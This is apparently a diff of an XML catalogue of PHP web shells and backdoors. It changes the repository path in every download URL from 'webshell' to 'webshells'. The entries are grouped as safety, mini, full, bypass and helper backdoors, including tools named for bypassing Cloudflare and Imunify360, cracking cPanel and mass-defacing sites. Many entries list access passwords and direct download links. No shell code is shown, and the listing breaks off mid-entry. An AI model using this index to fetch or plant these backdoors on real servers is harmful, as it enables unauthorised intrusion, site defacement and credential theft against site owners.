@@ -3,481 +3,481 @@
   <category name="Safety Backd00r">
     <item>
       <name>Alfa Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/alf4pw_view.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/alf4pw_view.webp</image>
       <size>309kb</size>
       <password>admin/ehsan</password>
       <version>3.0.2</version>
-      <download>https://adilhyz.github.io/webshell/PHP/alf4.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/alf4.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/alf4.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/alf4.php</raw>
     </item>
     <item>
       <name>3rei Priv8 Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/3rei_view.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/3rei_view.webp</image>
       <size>20kb</size>
       <password>mangsut#123</password>
       <version>1.0.1</version>
-      <download>https://adilhyz.github.io/webshell/PHP/me/3rei.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/me/3rei.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/me/3rei.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/me/3rei.php</raw>
     </item>
     <item>
       <name>407 Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/407_view.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/407_view.webp</image>
       <size>94kb</size>
       <password>myshell</password>
       <version>2.0</version>
-      <download>https://adilhyz.github.io/webshell/PHP/407.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/407.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/407.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/407.php</raw>
     </item>
     <item>
       <name>B374K Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/b374k_view.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/b374k_view.webp</image>
       <size>115kb</size>
       <password>b374k</password>
       <version>-</version>
-      <download>https://adilhyz.github.io/webshell/PHP/b374k.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/b374k.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/b374k.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/b374k.php</raw>
     </item>
     <item>
       <name>B374K White Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/b373_view.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/b373_view.webp</image>
       <size>223kb</size>
       <password>b374k</password>
       <version>3.2.3</version>
-      <download>https://adilhyz.github.io/webshell/PHP/b373.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/b373.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/b373.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/b373.php</raw>
     </item>
     <item>
       <name>CANTIX 1337 Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/cantix.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/cantix.webp</image>
       <size>19kb</size>
       <password>girls8i</password>
       <version>-</version>
-      <download>https://adilhyz.github.io/webshell/PHP/mini/cantix1337.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/mini/cantix1337.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/mini/cantix1337.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/mini/cantix1337.php</raw>
     </item>
     <item>
       <name>IndoSec Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/ix.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/ix.webp</image>
       <size>130kb</size>
       <password>IndoSec</password>
       <version>-</version>
-      <download>https://adilhyz.github.io/webshell/PHP/ix.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/ix.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/ix.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/ix.php</raw>
     </item>
   </category>
   <category name="File Manager">
     <item>
       <name>RC Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/4RC_view.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/4RC_view.webp</image>
       <size>20kb</size>
       <password>-</password>
       <version>3.0</version>
-      <download>https://adilhyz.github.io/webshell/PHP/FM/4RC.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/FM/4RC.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/FM/4RC.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/FM/4RC.php</raw>
     </item>
     <item>
       <name>RIES Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/ris.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/ris.webp</image>
       <size>31kb</size>
       <password>-</password>
       <version>-</version>
-      <download>https://adilhyz.github.io/webshell/PHP/FM/ris.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/FM/ris.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/FM/ris.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/FM/ris.php</raw>
     </item>
     <item>
       <name>Tiny File Manager</name>
-      <image>https://adilhyz.github.io/webshell/preview/manager.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/manager.webp</image>
       <size>192kb</size>
       <password/>
       <version>2.5.3</version>
-      <download>https://adilhyz.github.io/webshell/PHP/FM/manager.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/FM/manager.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/FM/manager.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/FM/manager.php</raw>
     </item>
     <item>
       <name>PHP File Manager</name>
-      <image>https://adilhyz.github.io/webshell/preview/4fp.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/4fp.webp</image>
       <size>969kb</size>
       <password>biadabkau</password>
       <version>1.7.9</version>
-      <download>https://adilhyz.github.io/webshell/PHP/FM/4FP.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/FM/4FP.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/FM/4FP.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/FM/4FP.php</raw>
     </item>
   </category>
   <category name="Mini Backd00r">
     <item>
       <name>DEFORCE ARMY Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/ad_view.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/ad_view.webp</image>
       <size>24kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/mini/ad.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/mini/ad.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/mini/ad.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/mini/ad.php</raw>
     </item>
     <item>
       <name>B374K Mini Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/b374km_view.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/b374km_view.webp</image>
       <size>14kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/mini/b374km.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/mini/b374km.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/mini/b374km.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/mini/b374km.php</raw>
     </item>
     <item>
       <name>Ribel Mini Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/ribel.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/ribel.webp</image>
       <size>15kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/mini/ribel.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/mini/ribel.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/mini/ribel.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/mini/ribel.php</raw>
     </item>
     <item>
       <name>Ipt Mini Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/ipt.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/ipt.webp</image>
       <size>16kb</size>
       <version>-</version>
       <password>admin/pass</password>
-      <download>https://adilhyz.github.io/webshell/PHP/mini/ipt.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/mini/ipt.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/mini/ipt.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/mini/ipt.php</raw>
     </item>
     <item>
       <name>Sanrei Mini Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/sanreimini.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/sanreimini.webp</image>
       <size>5kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/mini/sanreimini.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/mini/sanreimini.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/mini/sanreimini.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/mini/sanreimini.php</raw>
     </item>
     <item>
       <name>Sindbad Mini Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/sindbad.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/sindbad.webp</image>
       <size>9kb</size>
       <version>1.0</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/mini/Sindbad.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/mini/Sindbad.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/mini/Sindbad.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/mini/Sindbad.php</raw>
     </item>
     <item>
       <name>0Byt3 Mini Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/single.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/single.webp</image>
       <size>8kb</size>
       <version>2.0.0</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/mini/single.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/mini/single.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/mini/single.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/mini/single.php</raw>
     </item>
     <item>
       <name>Spade Mini Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/spade.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/spade.webp</image>
       <size>20kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/mini/spados.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/mini/spados.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/mini/spados.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/mini/spados.php</raw>
     </item>
     <item>
       <name>Ultra Mini Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/ultra.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/ultra.webp</image>
       <size>35kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/mini/ultra.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/mini/ultra.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/mini/ultra.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/mini/ultra.php</raw>
     </item>
     <item>
       <name>Patior Mini Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/vimpatior.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/vimpatior.webp</image>
       <size>13kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/mini/wp-fod.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/mini/wp-fod.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/mini/wp-fod.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/mini/wp-fod.php</raw>
     </item>
     <item>
       <name>Walker Mini Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/walker.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/walker.webp</image>
       <size>8kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/walker.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/walker.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/walker.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/walker.php</raw>
     </item>
     <item>
       <name>XsecId Mini Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/xsec.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/xsec.webp</image>
       <size>22kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/mini/xsec.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/mini/xsec.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/mini/xsec.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/mini/xsec.php</raw>
     </item>
   </category>
   <category name="Fully Backd00r">
     <item>
       <name>Alfa Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/alf4L_view.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/alf4L_view.webp</image>
       <size>446kb</size>
       <version>4.1</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/alf4L.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/alf4L.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/alf4L.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/alf4L.php</raw>
     </item>
     <item>
       <name>Alfa Remastered</name>
-      <image>https://adilhyz.github.io/webshell/preview/alf4r_view.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/alf4r_view.webp</image>
       <size>463kb</size>
       <version>4.1</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/alf4r.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/alf4r.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/alf4r.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/alf4r.php</raw>
     </item>
     <item>
       <name>Ayanami Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/ayanami_view.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/ayanami_view.webp</image>
       <size>38kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/me/ayanami.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/me/ayanami.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/me/ayanami.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/me/ayanami.php</raw>
     </item>
     <item>
       <name>Naxtarrr Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/NAX.webp</image>
-      <size>38kb</size>
+      <image>https://adilhyz.github.io/webshells/preview/NAX.webp</image>
+      <size>39kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/naxc.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/naxc.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/naxc.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/naxc.php</raw>
     </item>
     <item>
       <name>VoidGate Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/void.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/void.webp</image>
       <size>30kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/void.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/void.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/void.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/void.php</raw>
     </item>
     <item>
       <name>RBBD Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/rbbd.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/rbbd.webp</image>
       <size>28kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/RBBD.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/RBBD.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/RBBD.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/RBBD.php</raw>
     </item>
     <item>
       <name>SPL Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/spl.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/spl.webp</image>
       <size>184kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/spl.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/spl.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/spl.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/spl.php</raw>
     </item>
   </category>
   <category name="Bypass Backd00r">
     <item>
       <name>Negat1ve Bypass Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/3n3_view.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/3n3_view.webp</image>
       <size>21kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/403/3n3.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/403/3n3.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/403/3n3.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/403/3n3.php</raw>
     </item>
     <item>
       <name>Cloudflare Bypass Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/cloudflare.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/cloudflare.webp</image>
       <size>11kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/403/cloudflare.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/403/cloudflare.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/403/cloudflare.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/403/cloudflare.php</raw>
     </item>
     <item>
       <name>Privdayz Bypass Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/ant1.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/ant1.webp</image>
       <size>6kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/403/ant1.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/403/ant1.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/403/ant1.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/403/ant1.php</raw>
     </item>
     <item>
       <name>Gecko Img Bypass</name>
-      <image>https://adilhyz.github.io/webshell/preview/geckoimg.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/geckoimg.webp</image>
       <size>394kb</size>
       <version>1.2</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/403/geckobyp.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/403/geckobyp.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/403/geckobyp.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/403/geckobyp.php</raw>
     </item>
     <item>
       <name>Privdayz Imunify360</name>
-      <image>https://adilhyz.github.io/webshell/preview/imunify.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/imunify.webp</image>
       <size>13kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/403/imunify.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/403/imunify.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/403/imunify.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/403/imunify.php</raw>
     </item>
     <item>
       <name>0byt3 Remastered</name>
-      <image>https://adilhyz.github.io/webshell/preview/0byterema.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/0byterema.webp</image>
       <size>6kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/403/0byterema.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/403/0byterema.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/403/0byterema.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/403/0byterema.php</raw>
     </item>
     <item>
       <name>Sigunq Bypass Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/sigunq.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/sigunq.webp</image>
       <size>14kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/403/sigunq.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/403/sigunq.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/403/sigunq.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/403/sigunq.php</raw>
     </item>
     <item>
       <name>Youez Bypass Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/4non.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/4non.webp</image>
       <size>75kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/403/4NON.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/403/4NON.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/403/4NON.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/403/4NON.php</raw>
     </item>
     <item>
       <name>Yon3zu Bypass Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/yon03.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/yon03.webp</image>
       <size>13kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/403/yon03.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/403/yon03.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/403/yon03.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/403/yon03.php</raw>
     </item>
     <item>
       <name>Yami Root Bypass</name>
-      <image>https://adilhyz.github.io/webshell/preview/yami.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/yami.webp</image>
       <size>24kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/403/yami.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/403/yami.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/403/yami.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/403/yami.php</raw>
     </item>
     <item>
       <name>Zsec Mimetype Bypass</name>
-      <image>https://adilhyz.github.io/webshell/preview/zsec.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/zsec.webp</image>
       <size>3kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/403/zsec.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/403/zsec.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/403/zsec.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/403/zsec.php</raw>
     </item>
   </category>
   <category name="Helper Backd00r">
     <item>
       <name>Wp Cloak Panel</name>
-      <image>https://adilhyz.github.io/webshell/preview/cloakpanel.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/cloakpanel.webp</image>
       <size>3kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/helper/cloakpanel.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/helper/cloakpanel.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/helper/cloakpanel.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/helper/cloakpanel.php</raw>
     </item>
     <item>
       <name>Crack CPanel CN</name>
-      <image>https://adilhyz.github.io/webshell/preview/cpn.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/cpn.webp</image>
       <size>20kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/helper/cpn.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/helper/cpn.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/helper/cpn.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/helper/cpn.php</raw>
     </item>
     <item>
       <name>Crack CPanel V2</name>
-      <image>https://adilhyz.github.io/webshell/preview/cpnv2.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/cpnv2.webp</image>
       <size>57kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/helper/cpnv2.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/helper/cpnv2.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/helper/cpnv2.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/helper/cpnv2.php</raw>
     </item>
     <item>
       <name>Command Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/cmd.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/cmd.webp</image>
       <size>2kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/helper/cmd.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/helper/cmd.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/helper/cmd.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/helper/cmd.php</raw>
     </item>
     <item>
       <name>Command Img Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/cmdbyp.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/cmdbyp.webp</image>
       <size>26kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/helper/cmdbyp.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/helper/cmdbyp.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/helper/cmdbyp.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/helper/cmdbyp.php</raw>
     </item>
     <item>
       <name>Wolf Command Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/wolfcmd.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/wolfcmd.webp</image>
       <size>7kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/helper/wwwolf.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/helper/wwwolf.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/helper/wwwolf.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/helper/wwwolf.php</raw>
     </item>
     <item>
       <name>Echi Command Shell</name>
-      <image>https://adilhyz.github.io/webshell/preview/echicmd.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/echicmd.webp</image>
       <size>9kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/helper/echicmd.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/helper/echicmd.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/helper/echicmd.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/helper/echicmd.php</raw>
     </item>
     <item>
       <name>Mass Deface PHC</name>
-      <image>https://adilhyz.github.io/webshell/preview/massdef.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/massdef.webp</image>
       <size>3kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/helper/massdef.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/helper/massdef.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/helper/massdef.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/helper/massdef.php</raw>
     </item>
     <item>
       <name>Mass Deface</name>
-      <image>https://adilhyz.github.io/webshell/preview/massdeface.webp</image>
+      <image>https://adilhyz.github.io/webshells/preview/massdeface.webp</image>
       <size>2kb</size>
       <version>-</version>
       <password>-</password>
-      <download>https://adilhyz.github.io/webshell/PHP/helper/massdeface.php</download>
-      <raw>https://raw.githubusercontent.com/adilhyz/webshell/master/PHP/helper/massdeface.php</raw>
+      <download>https://adilhyz.github.io/webshells/PHP/helper/massdeface.php</download>
+      <raw>https://raw.githubusercontent.com/adilhyz/webshells/master/PHP/helper/massdeface.php</raw>
     </item>
     <item>
       <name>Root Bypass</name>
